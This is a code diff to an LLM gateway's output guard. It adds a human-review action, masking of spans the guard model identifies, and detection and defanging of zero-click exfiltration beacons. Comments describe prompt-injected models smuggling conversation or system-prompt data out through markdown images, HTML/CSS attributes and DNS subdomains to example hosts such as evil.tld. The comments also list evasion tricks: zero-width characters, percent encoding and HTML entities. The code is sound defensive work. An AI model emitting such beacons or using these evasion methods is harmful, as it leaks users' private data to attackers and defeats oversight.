@@ -13,8 +13,10 @@ Action precedence: block(4) > redact(3) > rewrite(2) > flag(1) > allow(0).
 """
 from __future__ import annotations
 
+import base64
 import logging
 import re
+import urllib.parse
 from dataclasses import dataclass, field
 from typing import TYPE_CHECKING
 
@@ -26,18 +28,28 @@ try:
         detect_credential_exposure,
         detect_hallucination_markers,
         detect_ip_leakage,
+        detect_pii,
+        detect_secrets,
         get_compliance_tags,
         is_safety_refusal_output,
         redact_all,
+        redact_all_scoped as _redact_all_scoped,
+        _iter_transport_decodes,
+        canonicalize_for_detection,
     )
 except ImportError:
     from patterns import (
         detect_credential_exposure,
         detect_hallucination_markers,
         detect_ip_leakage,
+        detect_pii,
+        detect_secrets,
         get_compliance_tags,
         is_safety_refusal_output,
         redact_all,
+        redact_all_scoped as _redact_all_scoped,
+        _iter_transport_decodes,
+        canonicalize_for_detection,
     )
 
 LOG = logging.getLogger("gateway.output_guard")
@@ -46,7 +58,33 @@ ACTION_PRIORITY = {"allow": 0, "flag": 1, "rewrite": 2, "redact": 3, "block": 4}
 
 # Per-detector output actions an operator may configure. Anything outside this
 # set falls back to the detector's default action.
-_VALID_OUTPUT_ACTIONS = frozenset({"block", "redact", "rewrite", "flag", "allow"})
+#
+# I-25: §1.7 names "human review" as an output-guardrail action, but the vocabulary
+# stopped at {block, redact, rewrite, flag, allow} — so an operator configuring
+# ``human_review`` silently got the detector's DEFAULT action instead. The
+# machinery it needs already exists end to end (``review_required`` flows through
+# _merge_output_enforcement_state, the enforcement telemetry, and the
+# X-ZeroShield-Review-Required response header); only the ACTION NAME was missing.
+# ``human_review`` is accepted here and normalised to ``flag`` + review_required by
+# ``normalize_output_action`` — the answer is still delivered, but it is queued for
+# a human and the client is told so. Shipping a spec-named control that silently
+# no-ops is the same defect class as I-03.
+HUMAN_REVIEW_ACTION = "human_review"
+_VALID_OUTPUT_ACTIONS = frozenset(
+    {"block", "redact", "rewrite", "flag", "allow", HUMAN_REVIEW_ACTION}
+)
+
+
+def normalize_output_action(action: str) -> tuple[str, bool]:
+    """Map a configured action to (enforced_action, review_required).
+
+    Only ``human_review`` sets the review flag; every other action passes through
+    unchanged so existing postures are untouched.
+    """
+    value = str(action or "").lower()
+    if value == HUMAN_REVIEW_ACTION:
+        return "flag", True
+    return value, False
 
 # C-1: output-threat categories that are SURGICALLY REDACTED-and-served (200),
 # never whole-response blocked. The tier-2 guard model emits pci (card numbers)
@@ -54,6 +92,382 @@ _VALID_OUTPUT_ACTIONS = frozenset({"block", "redact", "rewrite", "flag", "allow"
 # a benign answer incidentally containing a card/MRN must be masked-in-place, not
 # 403'd. (jailbreak/injection/hallucination/ip_leakage stay blockable.)
 _REDACTABLE_OUTPUT_CATEGORIES = frozenset({"pii", "pci", "phi", "secret", "credential"})
+
+# ── G13: output-side data-exfiltration channel neutralization ───────────────────
+# A model steered by indirect injection can embed its answer with an auto-rendering
+# markdown IMAGE (or a link / bare URL) that points at an attacker-controlled host
+# and smuggles data in the URL path/query/fragment:
+#     ![loading](https://evil.tld/log?d=<base64 of the conversation / system prompt>)
+# When the client renders the markdown, the browser silently GETs the URL — a
+# ZERO-CLICK exfiltration of whatever was encoded, EVEN WHEN the payload is not
+# PII-shaped (so the PII/secret/credential detectors never fire). This is Insecure
+# Output Handling (OWASP LLM02 / LLM05). The output guard neutralizes the channel:
+# it defangs the auto-render (image -> plain link) and masks the smuggled payload,
+# delivering the rest of the answer intact (surgical redact, never whole-block).
+# G43: scheme is OPTIONAL — a PROTOCOL-RELATIVE url (``//evil.com/…``) auto-fetches
+# with the page's own scheme, so it is just as exfil-capable and must match everywhere.
+_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\(\s*<?((?:https?:)?//[^)\s<>]+)>?\s*\)", re.IGNORECASE)
+_MD_LINK_RE = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*<?((?:https?:)?//[^)\s<>]+)>?\s*\)", re.IGNORECASE)
+_BARE_URL_RE = re.compile(r"(?<![\]\(\[])https?://[^\s)<>\[\]]+", re.IGNORECASE)
+# G43: bare PROTOCOL-RELATIVE url in prose. Stricter than the absolute bare form to keep
+# FP low: requires a DOTTED host AND a path/query (so ``a//b`` math, ``//localhost`` and a
+# bare ``//host`` with no path do not match), and is gated by _url_smuggles_data
+# (defangs only on a sensitive payload), so benign ``//cdn.example`` text is untouched.
+_BARE_PROTOREL_RE = re.compile(
+    r"(?<![\w/:.])//[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}/[^\s)<>\[\]]+", re.IGNORECASE
+)
+# G41: HTML/SVG/CSS ZERO-CLICK auto-render beacons. A model steered by indirect
+# injection can emit raw HTML/CSS that a client renderer auto-fetches (exfil) even when
+# markdown images are sanitized — and the markdown-only defense above misses them (an
+# <img> src is only a "bare URL" to the scanner, which trips solely on a PII payload, so
+# an ARBITRARY-data HTML beacon rode out un-neutralized). These match the zero-click
+# media attributes (src/srcset/poster/data on img/iframe/video/audio/source/embed/object),
+# SVG <image|use href>, and CSS url(...). Each captures the URL as group(1). Every
+# quantifier is a bounded/greedy negated char class ([^"'>\s]+) or a bounded {0,200} —
+# no nested/ambiguous repetition, so they are LINEAR-time (ReDoS-safe).
+# Single-URL zero-click media attributes (auto-fetch): src on img/iframe/video/audio/
+# source/embed/track, <object data>, <video poster>, plus <form action|formaction> and
+# the deprecated background=/cite=. Each captures the URL as group(1).
+_HTML_ATTR_RE = re.compile(
+    r'\b(?:src|poster|data|action|formaction|background|cite)\s*=\s*["\']?\s*((?:https?:)?//[^"\'>\s]+)',
+    re.IGNORECASE,
+)
+# G42: href that AUTO-fetches or hijacks resolution — <link href> (preload/prefetch/
+# dns-prefetch/stylesheet/preconnect), SVG <image|use href>, <base href>. One-click
+# <a>/<area href> are deliberately NOT matched (handled as links, not zero-click).
+_HTML_HREF_RE = re.compile(
+    r'<\s*(?:link|image|use|base)\b[^>]{0,300}?\bhref\s*=\s*["\']?\s*((?:https?:)?//[^"\'>\s]+)',
+    re.IGNORECASE,
+)
+# G42: <meta http-equiv="refresh" content="0;url=..."> zero-click auto-navigation.
+_HTML_META_URL_RE = re.compile(
+    r'<\s*meta\b[^>]{0,300}?\burl\s*=\s*["\']?\s*((?:https?:)?//[^"\'>\s]+)', re.IGNORECASE,
+)
+_CSS_URL_RE = re.compile(r'url\(\s*["\']?\s*((?:https?:)?//[^"\')\s]+)', re.IGNORECASE)
+# G42: srcset carries MULTIPLE comma-separated "URL [descriptor]" candidates — G41's
+# single-URL capture defanged only the first, leaking the rest. Handle the whole value.
+_HTML_SRCSET_RE = re.compile(r'\bsrcset\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)
+_SRCSET_URL_RE = re.compile(r'(?:https?:)?//[^\s,]+')
+# A real responsive srcset is short; beyond this a value is pathological -> fail closed.
+_SRCSET_MAX_LEN = 4096
+_HTML_BEACON_RES = (_HTML_ATTR_RE, _HTML_HREF_RE, _HTML_META_URL_RE, _CSS_URL_RE)
+# Cap the number of URLs inspected per output so a pathological response with
+# thousands of links cannot make neutralization super-linear. G49: raised from 256 —
+# a legitimate single answer virtually never has this many DISTINCT URLs, and when the
+# budget IS exhausted _scan_exfil_channels emits a sentinel so _check_exfil_channel
+# fails CLOSED (block) instead of silently allowing a beacon hidden past the cap.
+_MAX_EXFIL_URLS = 1024
+# Sentinel finding kind yielded when the URL budget is exhausted (see G49).
+_EXFIL_BUDGET_SENTINEL = "__budget_exhausted__"
+
+
+def _url_tail(url: str) -> str:
+    """The exfil-bearing portion of a URL: path + query + fragment (scheme+host dropped).
+
+    G43: the scheme is OPTIONAL — a PROTOCOL-RELATIVE url (``//evil.com/log?d=…``)
+    auto-fetches using the page's own scheme, so it is just as exfil-capable as an
+    absolute one and must be recognised here too."""
+    m = re.match(r"(?:https?:)?//[^/?#]*(.*)", url, re.IGNORECASE)
+    return m.group(1) if m else ""
+
+
+def _url_host_prefix(url: str) -> str:
+    """``[scheme:]//host`` prefix of ``url`` (everything before path/query/fragment).
+    G43: scheme optional so protocol-relative hosts are handled."""
+    m = re.match(r"((?:https?:)?//[^/?#]*)", url, re.IGNORECASE)
+    return m.group(1) if m else url
+
+
+# G40: an opaque base64 token far longer than any legitimate URL signature
+# (AWS SigV4 <=344, tracking ids <=64) that the shared decoder SKIPS because its
+# plaintext exceeds _MAX_DECODE_BYTES (4096) — a large data-smuggling blob (whole
+# conversation / system prompt) in an image beacon. Bounded to opaque tokens >=512
+# chars so real signatures/tracking tokens never match.
+_OVERSIZED_B64_RE = re.compile(r"[A-Za-z0-9+/]{512,}={0,2}")
+# base64 chars that decode to ~4096 bytes (4 chars -> 3 bytes); a bounded prefix
+# is enough to classify the blob as encoded-text vs random binary.
+_OVERSIZED_DECODE_PREFIX = (4096 // 3) * 4
+
+
+def _tail_has_oversized_encoded_blob(tail: str) -> bool:
+    """True if ``tail`` carries an oversized opaque base64 token whose BOUNDED
+    prefix decodes to mostly-printable text — i.e. a data-smuggling blob the
+    _MAX_DECODE_BYTES cap otherwise skips. A random binary signature fails the
+    printability check, so this stays low-FP; only used as an IMAGE-beacon signal
+    (returned as ``encoded_payload``) so long opaque LINK tokens are unaffected."""
+    for m in _OVERSIZED_B64_RE.finditer(tail):
+        tok = m.group(0)
+        prefix = tok[:_OVERSIZED_DECODE_PREFIX]
+        try:
+            raw = base64.b64decode(prefix + "=" * (-len(prefix) % 4), validate=False)
+        except Exception:  # noqa: BLE001 - malformed base64 -> not a blob
+            continue
+        if not raw:
+            continue
+        printable = sum(1 for b in raw if 32 <= b < 127 or b in (9, 10, 13)) / len(raw)
+        if printable >= 0.85:
+            return True
+    return False
+
+
+# G90: a run of >=4 HTML numeric entities in a URL. A browser's HTML parser decodes ``&#NN;`` inside an
+# ``<img src>`` / ``<a href>`` attribute (markdown renders to exactly that), so an entity-encoded payload
+# in the URL is decoded by the client and exfiltrated. Entities in a URL are unusual (URLs use percent),
+# and a bare ``&#anchor`` fragment lacks the digit+``;``, so the >=4-entity gate is low-FP.
+_URL_ENTITY_RUN_RE = re.compile(r"(?:&#x[0-9A-Fa-f]{1,6};|&#[0-9]{1,7};){4,}")
+
+
+def _url_smuggles_data(url: str) -> str:
+    """Return a non-empty reason if ``url`` carries a smuggled data payload.
+
+    Two independent signals over the URL tail (path/query/fragment):
+      * ``"encoded_payload"`` — an encoded blob that base64/hex-DECODES to
+        mostly-printable text (arbitrary-data exfil: conversation, system prompt,
+        identifiers). A random hash / HMAC signature decodes to binary and does
+        NOT trip this, separating exfil from legit long opaque tokens. G40: an
+        oversized blob (plaintext > the decode cap) is also caught via a bounded
+        prefix decode so a LARGE image beacon cannot evade defang by size.
+      * ``"sensitive_payload"`` — detected PII / secret / credential in the raw or
+        decoded tail (plaintext or encoded PII exfil).
+    """
+    tail = _url_tail(url)
+    # G92: DNS-SUBDOMAIN exfil — data smuggled in the HOSTNAME (``https://<hex/base64-blob>.attacker.com/
+    # x.png``). When the client auto-fetches the beacon, RESOLVING the host leaks the subdomain to the
+    # attacker's authoritative DNS server (classic DNS exfiltration) — the HTTP request itself never needs
+    # to succeed. _url_tail DROPS scheme+host, so the exfil detector never saw the subdomain: PII-in-host
+    # is still caught by the text scan (the value is literal in the output), but ENCODED ARBITRARY data
+    # (base64/hex of conversation / system prompt) is not. Fold the host — its subdomain labels, '.'-'-'-'_'
+    # segmented so each label is an isolated decode candidate — into the SAME decode+detect analysis.
+    _hm = re.match(r"(?:https?:)?//([^/?#]*)", url, re.IGNORECASE)
+    host = _hm.group(1).split(":")[0].strip() if _hm else ""
+    if not tail and not host:
+        return ""
+    # A base64 blob smuggled in a PATH segment (…/beacon/<blob>.png) is fused with
+    # the surrounding '/' and '.' (both legal in base64/URLs) so it won't decode as
+    # one clean token. Also scan a delimiter-split view so each path/query segment
+    # is an isolated decode candidate. (The raw tail still covers query blobs that
+    # use standard-base64 '/' which the split would otherwise break.)
+    segmented = re.sub(r"[/?&=#;,.\s]+", " ", tail)
+    host_seg = re.sub(r"[.\-_]+", " ", host)
+    decoded_parts: list[str] = []
+    # G86: an exfil beacon can interleave zero-width/bidi/format (Cf) chars THROUGH the
+    # base64/hex blob in the URL (``?d=W​W​9​1…``). The RAW _iter_transport_decodes token
+    # regex breaks on the Cf, so the encoded_payload signal never fired and the auto-render
+    # beacon egressed raw — yet the attacker's server strips the (percent-encoded) Cf and
+    # decodes the exfiltrated data. Decode over the Cf-stripped + whitespace-collapsed views
+    # too (parity with detection's _iter_transport_decodes_canon, G75/G76). detect_* below is
+    # already Cf-aware (canonicalizes), so sensitive_payload was covered; only encoded_payload
+    # (arbitrary non-PII data: system prompt / conversation) was Cf-blind. Keep the outer-token
+    # >=24 gate (low-FP), so use _iter_transport_decodes over each derived source.
+    # G92: include the HOST + its '.'-segmented labels as decode sources so a base64/hex-encoded
+    # subdomain blob (DNS exfil) is decoded like a query/path blob. The >=24-token gate keeps benign
+    # short subdomains (api / cdn / www) out; a random hash subdomain decodes to binary and fails the
+    # printable check inside _iter_transport_decodes, so only a real readable-data blob trips it.
+    _base_sources = [s for s in (tail, segmented, host, host_seg) if s]
+    _sources = list(_base_sources)
+    for _b in _base_sources:
+        _c = canonicalize_for_detection(_b)
+        if _c != _b and _c not in _sources:
+            _sources.append(_c)
+        _w = re.sub(r"\s+", "", _b)
+        if _w != _b and _w not in _sources:
+            _sources.append(_w)
+    for src in _sources:
+        for tok, dec in _iter_transport_decodes(src):
+            if len(tok) >= 24 and len(dec) >= 8:
+                decoded_parts.append(dec)
+    # G89: URLs NATIVELY percent-encode data, so a PII/secret/credential payload smuggled as %XX
+    # (`?d=%31%32%33-...`) — which the receiving server transparently percent-decodes back to the raw
+    # value — evaded the sensitive_payload signal: detect_* canonicalize but do NOT percent-decode, and
+    # the base64/hex decoded_parts don't cover percent. Percent-decode the tail (and the Cf-stripped
+    # view) into the probe so the raw PII/secret is seen. Decode-gated by detect_* below, so benign URL
+    # escapes (`%2F`->'/', `%20`->' ') that decode to non-PII are untouched.
+    _pct_views: list[str] = []
+    for _p in (tail, canonicalize_for_detection(tail)):
+        try:
+            _pd = urllib.parse.unquote(_p)
+        except Exception:  # noqa: BLE001 - decode must never break the exfil scan
+            continue
+        if _pd and _pd != _p:
+            _pct_views.append(_pd)
+    # G90: a browser's HTML parser decodes ``&#NN;`` entities in an ``<img src>`` / ``<a href>``
+    # attribute (markdown renders to that), so an entity-encoded PII/secret/arbitrary-data payload in
+    # the URL is decoded by the client and exfiltrated. detect_* do NOT decode entities and the
+    # base64/hex/percent decoders don't cover them. Decode entity runs into the probe
+    # (sensitive_payload), and treat a substantial entity run decoding to printable text as an
+    # encoded_payload (arbitrary-data exfil, symmetric to the base64 signal). Entities in URLs are
+    # unusual (URLs use percent) -> low FP; the >=4-entity gate excludes a stray ``&#anchor``.
+    _ent_views: list[str] = []
+    _ent_encoded = False
+    if "&#" in tail:
+        for _e in (tail, canonicalize_for_detection(tail)):
+            _ed = _decode_encoded_run(_e)
+            if _ed and _ed != _e:
+                _ent_views.append(_ed)
+        for _m in _URL_ENTITY_RUN_RE.finditer(tail):
+            _dec = _decode_encoded_run(_m.group(0))
+            if (_dec != _m.group(0) and len(_dec) >= 8
+                    and sum(1 for _c in _dec if _c.isprintable()) / max(1, len(_dec)) >= 0.8):
+                _ent_encoded = True
+                break
+    probe = (
+        tail + "\n" + segmented
+        + (("\n" + host + "\n" + host_seg) if host else "")  # G92: PII/secret in the subdomain
+        + (("\n" + "\n".join(decoded_parts)) if decoded_parts else "")
+        + (("\n" + "\n".join(_pct_views)) if _pct_views else "")
+        + (("\n" + "\n".join(_ent_views)) if _ent_views else "")
+    )
+    if detect_pii(probe) or detect_secrets(probe) or detect_credential_exposure(probe):
+        return "sensitive_payload"
+    if decoded_parts or _ent_encoded:
+        return "encoded_payload"
+    # G40: fallback for an oversized opaque blob the decode-byte cap skipped. Scan
+    # BOTH the raw tail (query blobs) AND the delimiter-split view (so a PATH-segment
+    # blob fused with surrounding '/' and '.' is isolated and base64-aligned). G86: also
+    # the Cf-stripped canonical views so an oversized Cf-interleaved blob is not missed.
+    _c_tail, _c_seg = canonicalize_for_detection(tail), canonicalize_for_detection(segmented)
+    if (_tail_has_oversized_encoded_blob(tail) or _tail_has_oversized_encoded_blob(segmented)
+            or (_c_tail != tail and _tail_has_oversized_encoded_blob(_c_tail))
+            or (_c_seg != segmented and _tail_has_oversized_encoded_blob(_c_seg))):
+        return "encoded_payload"
+    return ""
+
+
+def _scan_exfil_channels(text: str):
+    """Yield ``(kind, url, reason)`` for each data-exfiltration channel in ``text``.
+
+    ``kind`` is ``"image"`` (zero-click auto-render), ``"link"`` (one-click) or
+    ``"bare"``. Images trip on EITHER signal (zero-click, and answer images are
+    static assets so an opaque data payload is the beacon signature — low FP).
+    Links / bare URLs trip ONLY on the stronger ``"sensitive_payload"`` signal:
+    they legitimately carry long opaque tokens (presigned / tracking URLs), so an
+    encoded-blob-alone would false-positive.
+    """
+    # G43: gate on "//" so protocol-relative beacons (no http/https scheme) are scanned.
+    if not text or "//" not in text:
+        return
+    seen: set[tuple[str, str]] = set()
+    budget = _MAX_EXFIL_URLS
+    # G41: "html" is a zero-click auto-render class (like "image") — trips on EITHER
+    # signal. url is group(1) for html beacons, group(2) for md image/link, whole
+    # match for bare.
+    passes = (
+        ("image", _MD_IMAGE_RE), ("link", _MD_LINK_RE), ("bare", _BARE_URL_RE),
+        ("bare", _BARE_PROTOREL_RE),
+        ("html", _HTML_ATTR_RE), ("html", _HTML_HREF_RE), ("html", _HTML_META_URL_RE),
+        ("html", _CSS_URL_RE),
+    )
+    # G42: srcset can carry several comma-separated source URLs — yield each smuggling one.
+    for sm in _HTML_SRCSET_RE.finditer(text):
+        for um in _SRCSET_URL_RE.finditer(sm.group(1)):
+            if budget <= 0:
+                yield _EXFIL_BUDGET_SENTINEL, "", "url_budget_exhausted"  # G49
+                return
+            budget -= 1
+            u = um.group(0).strip().rstrip(").,'\"")
+            if _url_smuggles_data(u) and ("html", u) not in seen:
+                seen.add(("html", u))
+                yield "html", u, _url_smuggles_data(u)
+    for kind, regex in passes:
+        for m in regex.finditer(text):
+            if budget <= 0:
+                yield _EXFIL_BUDGET_SENTINEL, "", "url_budget_exhausted"  # G49
+                return
+            budget -= 1
+            if kind in ("image", "link"):
+                url = m.group(2)
+            elif kind == "html":
+                url = m.group(1)
+            else:  # bare
+                url = m.group(0)
+            url = url.strip().rstrip(").,'\"")
+            reason = _url_smuggles_data(url)
+            if not reason:
+                continue
+            if kind not in ("image", "html") and reason != "sensitive_payload":
+                continue
+            key = (kind, url)
+            if key in seen:
+                continue
+            seen.add(key)
+            yield kind, url, reason
+
+
+def neutralize_exfil_channels(text: str) -> str:
+    """Defang output-side data-exfiltration channels: mask the smuggled payload and
+    stop the zero-click auto-render (image -> plain link). Strict no-op on benign
+    markdown / URLs (only constructs that trip :func:`_url_smuggles_data` change)."""
+    # G43: gate on "//" so protocol-relative beacons (no http/https scheme) are handled.
+    if not text or "//" not in text:
+        return text
+
+    def _defang(url: str) -> str:
+        raw = url.strip().rstrip(").,'\"")
+        # G92: DNS-subdomain exfil — when the HOST itself carries the smuggled payload
+        # (``https://<hex/base64-blob>.attacker.com/…``), preserving the host prefix would still leak
+        # it on DNS resolution (the HTTP request need not even succeed), so redact the ENTIRE reference
+        # rather than only the path/query. Otherwise keep the host prefix (transparency: the user still
+        # sees WHERE a tail-exfil beacon pointed).
+        _hm = re.match(r"(?:https?:)?//([^/?#]*)", raw, re.IGNORECASE)
+        _h = _hm.group(1).split(":")[0].strip() if _hm else ""
+        if _h and _url_smuggles_data("//" + _h):
+            return "[exfil-redacted]"
+        return f"{_url_host_prefix(raw)}/[exfil-redacted]"
+
+    def _img_sub(m: "re.Match[str]") -> str:
+        url = m.group(2).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url):  # image trips on either signal
+            return f"[{m.group(1)}]({_defang(url)})"  # drop leading '!' -> no auto-render
+        return m.group(0)
+
+    def _link_sub(m: "re.Match[str]") -> str:
+        url = m.group(2).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url) == "sensitive_payload":
+            return f"[{m.group(1)}]({_defang(url)})"
+        return m.group(0)
+
+    def _bare_sub(m: "re.Match[str]") -> str:
+        url = m.group(0).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url) == "sensitive_payload":
+            return _defang(url)
+        return m.group(0)
+
+    def _html_sub(m: "re.Match[str]") -> str:
+        # G41: zero-click HTML/CSS beacon — trip on EITHER signal (like an image). Replace
+        # the whole URL (not just the payload) with the marker so no scheme/host/payload
+        # remains: the tag can no longer auto-fetch the attacker AND carries no data.
+        url = m.group(1).strip().rstrip(").,'\"")
+        if _url_smuggles_data(url):
+            return m.group(0).replace(m.group(1), "[exfil-redacted]", 1)
+        return m.group(0)
+
+    def _srcset_sub(m: "re.Match[str]") -> str:
+        # G42: defang EVERY smuggling URL inside a (possibly multi-source) srcset value.
+        value = m.group(1)
+        # DoS bound: a legit responsive srcset is short (a handful of sizes). A
+        # pathologically long value (hundreds of URLs) would make the per-URL
+        # _url_smuggles_data scan slow, so fail closed and defang it wholesale.
+        if len(value) > _SRCSET_MAX_LEN and ("http://" in value or "https://" in value):
+            return m.group(0).replace(value, "[exfil-redacted]", 1)
+
+        def _one(um: "re.Match[str]") -> str:
+            u = um.group(0).strip().rstrip(").,'\"")
+            return "[exfil-redacted]" if _url_smuggles_data(u) else um.group(0)
+
+        neutralized = _SRCSET_URL_RE.sub(_one, value)
+        return m.group(0).replace(value, neutralized, 1) if neutralized != value else m.group(0)
+
+    # G41/G42: neutralize HTML/SVG/CSS zero-click beacons FIRST so the URL is gone before
+    # the bare-URL pass (which would otherwise only strip a PII payload and leave the tag's
+    # auto-render intact). Strict no-op on benign media (gated by _url_smuggles_data).
+    out = _HTML_SRCSET_RE.sub(_srcset_sub, text)
+    for _re in _HTML_BEACON_RES:
+        out = _re.sub(_html_sub, out)
+    out = _MD_IMAGE_RE.sub(_img_sub, out)
+    out = _MD_LINK_RE.sub(_link_sub, out)
+    out = _BARE_URL_RE.sub(_bare_sub, out)
+    out = _BARE_PROTOREL_RE.sub(_bare_sub, out)  # G43: protocol-relative bare urls
+    return out
 
 _STOPWORDS = frozenset({
     "the", "a", "an", "is", "are", "was", "were", "be", "been", "being",
@@ -113,6 +527,112 @@ def _mask_value_for_detail(value: str, max_len: int = 24) -> str:
     return f"{masked[:max_len]}{'…' if len(masked) > max_len else ''}"
 
 
+# ── G10: typed-placeholder masking of semantically-identified spans ─────────────
+# The tier-2 guard model can flag PII/secret content that has NO deterministic regex
+# (free-text names, non-standard card/ID layouts, passphrases). ``redact_all`` is a
+# no-op on those, so a "redact" verdict egressed the value raw (honestly relabeled to
+# "flag" by main.py, but still leaked). We mask the guard model's identified spans
+# with a typed placeholder so the redact actually removes the bytes.
+_TYPED_PLACEHOLDER = {
+    "pii": "[REDACTED_PII]",
+    "pci": "[REDACTED_CARD]",
+    "phi": "[REDACTED_PHI]",
+    "secret": "[REDACTED_SECRET]",
+    "credential": "[REDACTED_SECRET]",
+}
+# Bounds keep span-masking SURGICAL: skip a span too short to be a real value (noise)
+# or so long it is a whole sentence (masking it would destroy legit content — the
+# guard model is expected to return value-level evidence).
+_SPAN_MASK_MIN_LEN = 3
+_SPAN_MASK_MAX_LEN = 120
+
+
+def _typed_placeholder(threat_type: str) -> str:
+    return _TYPED_PLACEHOLDER.get(str(threat_type or "").lower(), "[REDACTED]")
+
+
+# A detector CATEGORY LABEL ("ssn", "email", "aws_access_key") — a lowercase
+# snake_case identifier — is NOT a raw sensitive value: it is safe to show in
+# evidence and must NOT be masked/used as a redaction span. The tier-2 guard model,
+# by contrast, returns RAW evidence fragments (free-text names, card numbers) that
+# MUST be masked. Length alone can't tell them apart; the key SHAPE can.
+_PATTERN_KEY_RE = re.compile(r"[a-z][a-z0-9_]{1,39}")
+
+
+def _looks_like_pattern_key(s: str) -> bool:
+    return bool(_PATTERN_KEY_RE.fullmatch(s or ""))
+
+
+def _mask_evidence_span(span: str, threat_type: str) -> str:
+    """Client-safe form of a guard-model evidence fragment (G16).
+
+    The tier-2 verdict's ``matched_patterns`` reaches the client via the enforcement
+    envelope (main.py) — it must never carry a RAW sensitive value. ``redact_all``
+    handles standard PII/secret; a category label stays readable; any remaining
+    free-text value (a name / passphrase redact_all has no regex for) is partial-
+    masked so it cannot leak the just-redacted value back through metadata."""
+    s = str(span)
+    r = redact_all(s)
+    if r != s:  # standard PII/secret regex masked it
+        return r
+    if len(s.strip()) < _SPAN_MASK_MIN_LEN or _looks_like_pattern_key(s.strip()):
+        return s  # category label / trivial fragment -> keep readable
+    return _mask_value_for_detail(s)
+
+
+def _redaction_spans_from(spans, threat_type: str) -> list[str]:
+    """Filter guard-model evidence spans to value-like fragments worth masking, and
+    only for redactable categories (so a jailbreak/injection evidence fragment is
+    never used to blank out response text). Category labels (pattern keys) are
+    excluded — they are not raw values, so they must never blank response text."""
+    if str(threat_type or "").lower() not in _REDACTABLE_OUTPUT_CATEGORIES:
+        return []
+    out: list[str] = []
+    for s in spans or []:
+        s = str(s).strip()
+        if not (_SPAN_MASK_MIN_LEN <= len(s) <= _SPAN_MASK_MAX_LEN):
+            continue
+        if "REDACTED" in s.upper() or _looks_like_pattern_key(s):
+            continue
+        out.append(s)
+    return out
+
+
+def _mask_spans_typed(text: str, spans, threat_type: str) -> str:
+    """Replace each literal ``span`` occurrence in ``text`` with a typed placeholder.
+
+    Literal (no regex) + bounded surgical removal of a semantically-identified value
+    the deterministic redactor could not match. Skips a span that alone would mask
+    more than ~40% of the response (guards against an over-broad sentence-level
+    evidence span). Fails toward redaction: a slightly incidental over-mask is
+    preferable to egressing the raw sensitive value."""
+    if not text or not spans:
+        return text
+    try:
+        from patterns import contains_smart_redaction_markers as _smart_ok
+    except ImportError:  # pragma: no cover
+        from .patterns import contains_smart_redaction_markers as _smart_ok
+    placeholder = _typed_placeholder(threat_type)
+    out = text
+    seen: set[str] = set()
+    for s in spans:
+        s = str(s).strip()
+        # The [_SPAN_MASK_MIN_LEN, _SPAN_MASK_MAX_LEN] bound is the only over-mask
+        # guard: too-short spans are noise; a span > _SPAN_MASK_MAX_LEN is an over-
+        # broad (sentence-level) evidence fragment and is refused. Any value-length
+        # span within bounds is masked even if it is a large fraction of a short
+        # answer — fail-toward-redaction (a placeholder never "nukes" legit content).
+        if s in seen or not (_SPAN_MASK_MIN_LEN <= len(s) <= _SPAN_MASK_MAX_LEN):
+            continue
+        # Already smart-masked (j***@a***.com) — do not replace with [REDACTED_PII].
+        if _smart_ok(s):
+            continue
+        seen.add(s)
+        if s in out:
+            out = out.replace(s, placeholder)
+    return out
+
+
 @dataclass
 class OutputVerdict:
     """Result of output inspection."""
@@ -124,11 +644,31 @@ class OutputVerdict:
     matched_patterns: list[str] = field(default_factory=list)
     matched_values: dict[str, str] = field(default_factory=dict)
     compliance_tags: list[str] = field(default_factory=list)
+    # G10: RAW sensitive spans the tier-2 guard model identified SEMANTICALLY (free-
+    # text names, non-standard card/ID layouts, passphrases) that ``redact_all`` has
+    # no deterministic regex for. The sanitizer masks these with a typed placeholder
+    # so a semantic redact verdict actually removes the bytes instead of being a
+    # no-op that egresses raw. Kept OFF the client-facing telemetry surface (never
+    # serialized by output_guard_telemetry_meta) so the raw span stays internal.
+    redaction_spans: list[str] = field(default_factory=list)
+    # STRICTLY-WHAT-THE-OPERATOR-SELECTED: the detector classes ("pii",
+    # "credential", "ip_leakage") whose configured action is REDACT, i.e. the only
+    # classes sanitization is permitted to mutate. ``redact_all`` masks every class
+    # at once, so with PII="flag" + Credential="redact" the email was masked too —
+    # mutating a class the operator explicitly chose not to mutate. EMPTY means
+    # "unscoped / mask everything", preserving legacy behaviour for verdicts built
+    # outside OutputGuard.inspect (tests, other call sites).
+    redact_classes: list[str] = field(default_factory=list)
     # M11: True when the tier-2 OUTPUT guard model could not scan (outage /
     # breaker-open / parse failure) and the response was passed UNSCANNED
     # (fail-open). Surfaced to telemetry + the client zeroshield metadata so a
     # guard outage is VISIBLE, not silent.
     scan_degraded: bool = False
+    # I-25: True when the operator configured the §1.7 ``human_review`` action for
+    # the detector that fired. The answer is still DELIVERED (the action normalises
+    # to ``flag``), but the request is queued for a human and the client is told via
+    # the existing X-ZeroShield-Review-Required header.
+    review_required: bool = False
 
 
 @dataclass
@@ -141,6 +681,20 @@ class HallucinationScore:
     contradiction_score: float = 0.0
     matched_markers: list[str] = field(default_factory=list)
     detail: str = ""
+
+
+def normalize_output_scan_text(text: str) -> str:
+    """Return model-generated text suitable for OUTPUT-guard scanning.
+
+    Whitespace-only completions are treated as empty (L7): the guard must not
+    run PII/secret checks when the model produced no substantive output bytes.
+    Non-empty text is returned unchanged (internal spacing preserved).
+    """
+    if not text or not isinstance(text, str):
+        return ""
+    if not text.strip():
+        return ""
+    return text
 
 
 class OutputGuard:
@@ -209,6 +763,7 @@ class OutputGuard:
             org_slug: Tenant identifier passed to the semantic grounding
                 backend for embedder cache isolation and telemetry.
         """
+        text = normalize_output_scan_text(text)
         if not text:
             return OutputVerdict()
 
@@ -222,16 +777,93 @@ class OutputGuard:
         def _enabled(key: str, default: bool = True) -> bool:
             return bool(cfg.get(key, default))
 
+        _review_requested: list = []
+
         def _action(key: str, default: str) -> str:
             value = str(cfg.get(key, default) or default).lower()
-            return value if value in _VALID_OUTPUT_ACTIONS else default
+            if value not in _VALID_OUTPUT_ACTIONS:
+                return default
+            # I-25: normalise ``human_review`` -> ``flag`` + review_required so every
+            # downstream branch keeps seeing the 5 enforcement actions it understands,
+            # while the review intent is preserved rather than silently dropped.
+            enforced, review = normalize_output_action(value)
+            if review:
+                _review_requested.append(key)
